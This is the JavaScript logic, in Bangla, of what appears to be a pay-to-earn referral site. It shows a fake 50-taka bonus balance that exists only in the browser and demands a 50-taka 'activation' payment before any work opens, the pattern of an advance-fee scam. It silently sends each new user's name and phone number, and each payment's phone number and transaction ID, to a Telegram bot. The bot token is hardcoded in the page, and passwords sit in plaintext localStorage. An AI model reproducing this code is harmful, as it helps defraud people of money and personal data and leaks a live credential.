<!-- জাভাস্ক্রিপ্ট লজিক -->  
    <script>  
        const BOT_TOKEN = '8726008499:AAFIajdSOavCs8lB8Yh2IlODwEqsmyr9-2c';  
        const CHAT_ID = '6733473116';  
        let isRegisterMode = false;

        window.addEventListener('DOMContentLoaded', () => {  
            const urlParams = new URLSearchParams(window.location.search);  
            const refCode = urlParams.get('ref');  
            if(refCode) {
                localStorage.setItem('hi_temp_ref', refCode);
                switchAuthMode('register');
                document.getElementById('regReferCode').value = refCode;
            }

            const currentUser = localStorage.getItem('hi_logged_user');  
            if (!currentUser) {  
                document.getElementById('authScreen').classList.remove('hidden');  
                document.getElementById('dashboardContainer').classList.add('hidden');  
            } else {  
                document.getElementById('authScreen').classList.add('hidden');
                loadDashboard(JSON.parse(currentUser));  
            }  
        });  

        function switchAuthMode(mode) {
            isRegisterMode = (mode === 'register');
            const nameContainer = document.getElementById('nameFieldContainer');
            const referContainer = document.getElementById('referFieldContainer');
            const formTitle = document.getElementById('formTitle');
            const formSubtitle = document.getElementById('formSubtitle');
            const submitBtn = document.getElementById('authSubmitBtn');
            const loginBtn = document.getElementById('loginTabBtn');
            const registerBtn = document.getElementById('registerTabBtn');

            if(isRegisterMode) {
                nameContainer.classList.remove('hidden');
                referContainer.classList.remove('hidden');
                formTitle.innerText = "নতুন অ্যাকাউন্ট তৈরি করুন";
                formSubtitle.innerText = "সাইন আপ করলেই পাবেন ৫০ টাকা বোনাস!";
                submitBtn.innerText = "একাউন্ট তৈরি করুন";
                registerBtn.className = "py-2.5 rounded-xl bg-emerald-500 text-slate-950 transition";
                loginBtn.className = "py-2.5 rounded-xl text-slate-400 transition";
            } else {
                nameContainer.classList.add('hidden');
                referContainer.classList.add('hidden');
                formTitle.innerText = "লগইন করুন";
                formSubtitle.innerText = "আপনার অ্যাকাউন্টে প্রবেশ করতে তথ্য দিন";
                submitBtn.innerText = "লগইন করুন";
                loginBtn.className = "py-2.5 rounded-xl bg-emerald-500 text-slate-950 transition";
                registerBtn.className = "py-2.5 rounded-xl text-slate-400 transition";
            }
        }

        function handleAuthSubmit(event) {
            event.preventDefault();
            const phone = document.getElementById('authPhone').value.trim();
            const password = document.getElementById('authPassword').value.trim();
            
            let usersList = JSON.parse(localStorage.getItem('hi_all_users') || '[]');

            if(isRegisterMode) {
                const name = document.getElementById('regName').value.trim();
                const referCodeInput = document.getElementById('regReferCode').value.trim();

                const existing = usersList.find(u => u.phone === phone);
                if(existing) {
                    showCustomPopup('⚠️ এই মোবাইল নম্বর দিয়ে ইতিমধ্যে একটি অ্যাকাউন্ট রয়েছে!');
                    return;
                }

                const userId = Math.floor(100000 + Math.random() * 900000).toString();
                const referCode = 'REF-' + Math.floor(10000 + Math.random() * 90000);

                const newUser = {
                    name: name,
                    phone: phone,
                    password: password,
                    userId: userId,
                    referCode: referCode,
                    balance: 50.00,
                    active: false,
                    referredBy: referCodeInput || ''
                };

                usersList.push(newUser);
                localStorage.setItem('hi_all_users', JSON.stringify(usersList));
                localStorage.setItem('hi_logged_user', JSON.stringify(newUser));

                // টেলিগ্রামে নতুন রেজিস্ট্রেশনের নোটিফিকেশন পাঠানোর কোড
                const regMsg = `👤 নতুন ইউজার রেজিস্ট্রেশন!\n\n📛 নাম: ${name}\n📱 নম্বর: ${phone}\n🆔 ইউজার আইডি: #${userId}\n🔗 রেফার কোড: ${referCodeInput || 'কেউ না'}`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(regMsg)}`)
                .catch(err => console.log(err));

                showCustomPopup('অভিনন্দন! সফলভাবে অ্যাকাউন্ট তৈরি হয়েছে এবং ৫০ টাকা বোনাস যোগ হয়েছে।');
                setTimeout(() => {
                    location.reload();
                }, 1500);

            } else {
                const foundUser = usersList.find(u => u.phone === phone && u.password === password);
                if(!foundUser) {
                    showCustomPopup('⚠️ ভুল মোবাইল নম্বর অথবা পাসওয়ার্ড!');
                    return;
                }

                localStorage.setItem('hi_logged_user', JSON.stringify(foundUser));
                document.getElementById('authScreen').classList.add('hidden');
                loadDashboard(foundUser);
            }
        }

        function loadDashboard(user) {  
            document.getElementById('authScreen').classList.add('hidden');
            document.getElementById('dashboardContainer').classList.remove('hidden');  
            document.getElementById('userNameDisplay').innerText = user.name;  
            document.getElementById('profileNameDisplay').innerText = user.name;  
            document.getElementById('userIdDisplay').innerText = 'ID: #' + user.userId;  
            document.getElementById('profileUserIdText').innerText = 'ID: #' + user.userId;  
            document.getElementById('mainBalanceDisplay').innerText = '৳' + (user.balance || 50.00).toFixed(2);  
            document.getElementById('profileReferCode').innerText = user.referCode;  

            const link = window.location.origin + window.location.pathname + '?ref=' + user.referCode;  
            document.getElementById('referLinkInput').value = link;  

            if(user.active) {  
                document.getElementById('statusText').innerText = 'Active';  
                document.getElementById('badgeStatus').className = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[10px] px-2.5 py-1 rounded-full font-bold flex items-center gap-1";  
                document.getElementById('inactiveAlertCard').style.display = 'none';  
            }  
        }  

        function logoutUser() {  
            localStorage.removeItem('hi_logged_user');  
            location.reload();  
        }  

        function checkTaskAccess(taskName) {  
            let user = JSON.parse(localStorage.getItem('hi_logged_user'));  
            if(!user.active) {  
                showCustomPopup('⚠️ কাজ শুরু করতে আগে ৫০ টাকা দিয়ে একাউন্ট Active করুন!');  
                return;  
            }  
            showCustomPopup(taskName + ' সেকশনে আপনাকে স্বাগতম!');  
        }  

        function copyReferLink() {  
            const copyText = document.getElementById("referLinkInput");  
            navigator.clipboard.writeText(copyText.value);  
            showCustomPopup("রেফারেল লিঙ্ক সফলভাবে কপি করা হয়েছে!");  
        }  

        function openActivationModal() { document.getElementById('activationModal').classList.remove('hidden'); }  
        function openProfileModal() { document.getElementById('profileModal').classList.remove('hidden'); }  
        function closeModal(id) { document.getElementById(id).classList.add('hidden'); }  
        function showCustomPopup(msg) {  
            document.getElementById('customPopupText').innerText = msg;  
            document.getElementById('customPopupModal').classList.remove('hidden');  
        }  
        function closeCustomPopup() { document.getElementById('customPopupModal').classList.add('hidden'); }  

        function handleActivationSubmit(event) {  
            event.preventDefault();  
            const phone = document.getElementById('senderPhone').value;  
            const trxid = document.getElementById('senderTrxid').value;  
            const btn = document.getElementById('submitBtn');  

            btn.innerText = 'পাঠানো হচ্ছে...';  
            btn.disabled = true;  

            const msg = `🔔 নতুন একটিভেশন রিকোয়েস্ট!\n📱 নম্বর: ${phone}\n🆔 TrxID: ${trxid}`;  
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)  
            .then(res => res.json())  
            .then(data => {  
                closeModal('activationModal');  
                showCustomPopup('পেমেন্ট রিকোয়েস্ট সফলভাবে জমা হয়েছে!');  
            }).finally(() => {  
                btn.innerText = 'রিকোয়েস্ট পাঠান';  
                btn.disabled = false;  
            });  
        }  
    </script>
